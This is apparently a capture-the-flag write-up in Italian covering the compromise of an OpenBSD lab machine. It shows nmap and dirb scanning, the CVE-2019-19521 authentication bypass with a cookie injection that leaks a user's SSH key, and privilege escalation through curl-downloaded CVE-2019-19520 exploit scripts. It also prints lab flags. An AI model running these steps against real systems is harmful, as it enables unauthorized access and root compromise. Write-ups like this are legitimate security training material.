@@ -1,0 +1,79 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.10.199
+
+	PORT   STATE SERVICE REASON  VERSION                                                                                                                                                                                                       
+	22/tcp open  ssh     syn-ack OpenSSH 8.1 (protocol 2.0)                                                                                                                                                                                    
+	| ssh-hostkey:                                                                                                                                                                                                                             
+	|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)                                                                                                                                                                             
+	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDe8l1l+kUpCKDTLXtOj9CY1xcde98zhpP0ANXSj7eI2KRVQuOpowxjzNf/NrDoIffaCtsNY36nnVw5JDbX2zU0+wKeMEoVHBlelNSneBHrYv4CuhlO7ll6tHZcs0kWSvFk8nipNTYXSm48EhFbspsC89Yv7REeRFq+uE1unEo8d+Dt2MmDzNnu+QtATp4wlSE1LIROq7cDRsR10S5j6fnaRbEYGquXSJkW6sV6PTZhGm8y6sXXQ3RynYJ129m5YTevg4fKpF/FkfEuPn5sRIj+aZCT6GjP9WEae+R/6lVEcMOmuq9K9CCqoGuwGakoK+m/upQDlI7pXcN8359a7XcMXSgriJIjV8yv350JsdLqIN704w5NLowAaInYPqXKNrXdxa5olprzF1dMlN0ClvV96tX9bg2ERrRhrLbSOZudrqefMNjSKqdNWLh7AQh8TnwdDMdXf/IOat1CjQMNwPTi3XkklU+Lm92J8Nd6gO8uLd6HuRLPVxUqJp6hKwLIbHM=
+	|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOM044THRHSb9MKRgg+pCGqLErFIOMaaGjCwwSpxVFsdQWW9kg3fROwqwtNVM1McgJ4Y4NwVzl+w5DZGK2OdhNE=
+	|   256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKuJoZTZonWY0/JkBfYeM2POVzE/TZfUJGA10PMXB1s
+	80/tcp open  http    syn-ack OpenBSD httpd
+	| http-methods: 
+	|_  Supported Methods: GET HEAD
+	|_http-title: Site doesn't have a title (text/html).
+
+---------------------------------------------------------------------------------------------------------------
+Andiamo al link 10.10.10.199 e verifichiamo controlliamo il codice della pagina
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+[ip]	[host]
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.10.199 -w /usr/share/wordlists/dirb/common.txt
+Troviamo una cartella interssante /includes, con all'interno 2 file: auth.php e auth.php.swp
+Scarichiamo auth.php.swp ed effettuiamo il recover tramite il comando
+	vim -r auth.php.swp
+Così possiamo leggerlo con più chiarezza. Comunque nel file swp c'è un nome "jennifer" da tenere in considerazione.
+Apriamo auth.php.swp. Troviamo il riferimento ad un link ../auth_helpers/check_auth
+Apriamo il link 10.10.10.199/auth_helpers e troviamo un file check_auth, che possiamo scaricare, ma non è un file di testo.
+---------------------------------------------------------------------------------------------------------------
+Effettuando il comando "strings check_auth", notiamo la seguente stringa "OpenBSD libc.so.95.1". Cerchiamo degli exploit. (https://seclists.org/bugtraq/2019/Dec/8)
+Troviamo qualcosa a riguardo. Si può effettuare il bypass dell'autenticazione utilizzando l'user "-schallenge" ed effettivamente,
+provando con questo user, il login non ci torna la solita scritta "Authetication denied" ma la scritta "OpenSSH key not found for user "-schallenge""
+Proviamo eseguendo il comando da terminale "ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 10.10.10.199"
+
+Così facendo, scopriamo che ssh è vulnerabile a CVE-2019-19521
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo il login con le seguenti credenziali -schallenge:1234, intercettiamo con burpsuit e nei cookie aggiungiamo la seguente stringa ";username=jennifer"
+La pagina visualizzerà la chiave privata dell'utente jennifer
+---------------------------------------------------------------------------------------------------------------
+Copiamo la chiave privata in un file, impostiamo il permesso chmod 700 e usiamo la chiave privata per accedere
+ssh -i id_rsa jennifer@10.10.10.199
+
+Perfetto, siamo dentro!
+---------------------------------------------------------------------------------------------------------------
+Inviamo i seguenti comandi:
+whoami -> jennifer
+pwd -> /home/jennifer
+ls -> lista di file
+cat user.txt -> 36ab21239a15c537bde90626891d2b10
+---------------------------------------------------------------------------------------------------------------
+Cerchiamo un exploit per la privilege escalation.
+Proviamo il seguente https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19726/openbsd-dynamic-loader-chpass
+
+sudo python -m SimpleHTTPServer 80 -> Avviamo il server sulla nostra macchina 
+Proviamo wget ma non è installato. Proviamo con curl 
+curl http://10.10.10.133/exploit.sh --output exploit.sh 
+chmod 777 exploit.sh
+./exploit.sh
+whoami -> Jennifer. 
+Non ha funzionato. Cerchiamo altro
+
+---------------------------------------------------------------------------------------------------------------
+Proviamo con quest'altro exploit
+https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot
+
+curl http://10.10.10.133/exploit2.sh --output exploit2.sh 
+chmod 777 exploit2.sh
+./exploit2.sh
+Ci chiede di inserire la password -> EGG LARD GROW HOG DRAG LAIN
+whoami -> root
+
+cat root.txt -> f3a553b1697050ae885e7c02dbfc6efa
+
